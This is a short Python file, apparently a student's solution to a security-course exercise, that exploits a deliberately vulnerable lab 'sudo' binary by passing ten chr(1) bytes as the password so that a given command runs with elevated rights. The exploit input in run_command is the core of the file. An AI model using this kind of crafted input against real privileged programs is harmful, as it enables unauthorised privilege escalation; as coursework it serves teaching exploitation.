import os
import sys


def run_command(cmd: str, path_to_sudo: str):
    """
    Run the provided command using the vulnerable sudo program.

    WARNING! THIS FUNCTION MUST WORK EVEN IF SUDO IS PLACED IN A DIFFERENT PATH!
    Use the provided path to the sudo program, and avoid hard-coding the path in
    the exercise directory!

    Tips:
    1. To invoke the sudo program, use `os.execl(path_to_sudo, *args)`. Avoid
       using `os.system(...)` as this will throw surprising exceptions on some
       inputs.
    2. The first argument passed in `args` parameter of `os.execl` should be the
       path to the program itself.

    :param cmd: The command to run.
    :param path_to_sudo: The path to the vulnerable sudo program.
    """
    #run the sudo program with password \x1\x1\x1\x1\x1\x1\x1\x1\x1\x1 and the givven commend 
    exploit = chr(1)*10
    os.execl(path_to_sudo, path_to_sudo, exploit, cmd)


def main(argv):
    # WARNING: Avoid changing this function.
    if not len(argv) == 2:
        print('Usage: %s <command>' % argv[0])
        sys.exit(1)

    cmd = argv[1]
    run_command(cmd, path_to_sudo='./sudo')


if __name__ == '__main__':
    main(sys.argv)
